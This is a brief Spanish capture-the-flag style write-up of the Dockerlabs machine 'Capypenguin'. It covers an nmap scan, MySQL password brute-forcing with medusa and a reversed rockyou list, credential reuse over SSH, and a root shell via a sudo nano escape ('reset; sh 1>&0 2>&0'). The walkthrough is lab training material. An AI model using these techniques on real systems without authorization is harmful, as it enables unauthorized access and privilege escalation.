Máquina Capypenguin

Inciamos con nmap para el reconocimiento inicial:

```
# Nmap 7.94SVN scan initiated Fri Apr 19 08:55:08 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN Target 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000050s latency).
Scanned at 2024-04-19 08:55:08 CEST for 1s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos un ssh un http y un mysql, vamos a empezar enumerando el http:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/cb7ef27c-9c30-453f-bdd9-ed7738de3c71)

Bueno teniendo en cuenta lo que nos dice la páguina web:

```
tac /usr/share/wordlists/rockyou.txt > MiRockYou.txt
```

Ahora hacemos la explotación con medusa:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/c594fb6a-0121-4880-866f-0080f0f46856)

y nos encuentra la contraseña de la base de datos mysql, vamos a meternos dentro a ver que hay:

Dentro de la base de datos encontramos unas credenciales, vamos a probarlas en el ssh:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/18f615ea-70dd-43a5-bb23-3e75adadc02b)


y efectivamente estamos dentro del ssh, iniciamos la escalada:

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/bf2d3b83-0c1f-47f7-807b-01d23ccb41b9)


Al poner el comando sudo -l me encuentro que nano lo puedo utilizar como super usuario:

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/2e27727f-398b-421c-879e-745ed828cf0e)


Dificultado 1/5


